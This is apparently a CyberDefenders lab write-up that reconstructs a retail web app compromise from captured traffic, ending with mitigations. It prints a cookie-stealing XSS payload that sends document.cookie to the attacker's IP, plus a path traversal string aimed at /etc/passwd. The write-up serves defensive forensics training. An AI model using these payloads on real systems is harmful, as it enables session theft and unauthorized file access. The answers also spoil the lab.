# CyberDefenders – RetailBreach Lab

**Category:** Network Forensics  
**Difficulty:** Easy  
**Tools Used:** Wireshark, NetworkMiner, Brim  
**Focus:** Network Traffic Analysis, Directory Brute-Forcing, Cross-Site Scripting (XSS), Session Hijacking, Path Traversal

## 1. Lab Overview

The RetailBreach Lab focuses on investigating a web application compromise through network traffic analysis.

The attacker performs reconnaissance against a retail web application, discovers hidden directories using directory brute-forcing, and exploits a Cross-Site Scripting (XSS) vulnerability to steal an administrator's session cookie.

Using the stolen session token, the attacker gains unauthorized access to the application and exploits a path traversal vulnerability to access sensitive system files.

The objective is to reconstruct the attacker's activities using PCAP analysis and identify the tools, payloads, session information, and vulnerable application components.

## 2. Investigation and Methodology

### Q1. Identify the attacker's IP address

I inspected the captured network traffic using Wireshark and analyzed the source and destination IP addresses of suspicious HTTP requests.

The traffic revealed repeated requests originating from an external IP address targeting the retail web application.

**Finding:**

```text
111.224.180.128
```

This address was identified as the attacker's IP address.

### Q2. Identify the directory brute-forcing tool

The attacker performed directory enumeration to discover hidden paths and resources within the web application.

I examined the HTTP request patterns and User-Agent information in the captured traffic.

The requests were consistent with automated directory brute-forcing using Gobuster.

**Finding:**

```text
gobuster
```

Gobuster is a directory and file enumeration tool commonly used during web application reconnaissance.

### Q3. Identify the XSS payload

Cross-Site Scripting allows an attacker to inject JavaScript into a web application that executes in another user's browser.

I inspected the HTTP requests and identified a malicious script designed to extract the victim's browser cookies and transmit them to the attacker's server.

The payload was:

```javascript
<script>fetch('http://111.224.180.128/' + document.cookie);</script>
```

The script uses the JavaScript Fetch API to send the browser's cookie information to the attacker's IP address.

**Finding:** The attacker used a cookie-exfiltration XSS payload.

### Q4. Identify when the administrator first visited the malicious page

To reconstruct the attack timeline, I examined the HTTP traffic associated with the administrator's interaction with the compromised page.

The injected JavaScript would execute when the administrator visited the page containing the malicious content.

I correlated the relevant HTTP requests and identified the timestamp of the administrator's first visit.

**Finding:**

```text
2024-03-29 12:09 UTC
```

This timestamp represents the first identified administrator interaction with the malicious page.

### Q5. Identify the stolen session token

After the administrator executed the injected JavaScript, the browser transmitted its session cookie to the attacker's server.

I inspected the HTTP requests sent to the attacker's IP address and identified the stolen session token.

**Finding:**

```text
lqkctf24s9h9lg67teu8uevn3q
```

Session tokens are used by web applications to maintain authenticated user sessions.

By stealing the administrator's session token, the attacker could potentially impersonate the administrator without knowing their password.

### Q6. Identify the exploited script

I analyzed the HTTP requests to determine which application component was targeted by the attacker.

The investigation identified the following PHP script:

```text
log_viewer.php
```

This script was exploited by the attacker during the web application compromise.

**Finding:** `log_viewer.php`

### Q7. Identify the path traversal payload

The attacker attempted to access sensitive files outside the intended web application directory.

I examined the HTTP request parameters and identified a path traversal payload containing multiple directory traversal sequences.

The payload was:

```text
../../../../../etc/passwd
```

The `../` sequences attempt to move up through parent directories until reaching the filesystem root.

The attacker targeted:

```text
/etc/passwd
```

This Linux system file contains local account information.

**Finding:** The attacker used a directory traversal payload to access `/etc/passwd`.

## 3. Attack Timeline

The investigation reveals the following sequence of events:

1. **Reconnaissance:** The attacker identified the retail web application and began enumerating its accessible resources.
2. **Directory Enumeration:** Gobuster was used to discover hidden directories and application paths.
3. **Initial Access / Exploitation:** The attacker exploited an XSS vulnerability by injecting malicious JavaScript.
4. **Credential Access:** The malicious script extracted the administrator's browser session cookie.
5. **Session Hijacking:** The attacker obtained the administrator's session token and used it for unauthorized access.
6. **Application Exploitation:** The attacker targeted the vulnerable `log_viewer.php` script.
7. **File Access:** A path traversal payload was used to attempt access to `/etc/passwd`.

## 4. Key Security Findings

- Directory enumeration exposed application paths and resources.
- The web application was vulnerable to Cross-Site Scripting.
- User-controlled content was not adequately sanitized or encoded.
- The administrator's session cookie was accessible to injected JavaScript.
- The application did not adequately protect authenticated sessions.
- The `log_viewer.php` script was vulnerable to exploitation.
- Insufficient path validation allowed directory traversal attempts.

## 5. Recommended Mitigations

1. Implement context-aware output encoding to prevent XSS.
2. Sanitize and validate all user-controlled input.
3. Configure session cookies with `HttpOnly`, `Secure`, and appropriate `SameSite` attributes.
4. Implement Content Security Policy (CSP).
5. Regenerate session identifiers after authentication.
6. Revoke compromised sessions and rotate affected credentials.
7. Validate file paths and restrict file access to authorized directories.
8. Apply least-privilege permissions to application processes.
9. Monitor suspicious directory enumeration and abnormal HTTP requests.
10. Implement centralized logging and continuous security monitoring.

## 6. Conclusion

The RetailBreach investigation demonstrates how multiple web application vulnerabilities can be combined to compromise an organization.

The attacker began with reconnaissance and directory enumeration, followed by XSS exploitation to steal an administrator's session token. The stolen session information enabled unauthorized access, after which the attacker targeted a vulnerable PHP script and attempted to access sensitive system files through path traversal.

This lab highlights the importance of secure input handling, session management, access control, and file path validation.

**Tools used:** Wireshark, NetworkMiner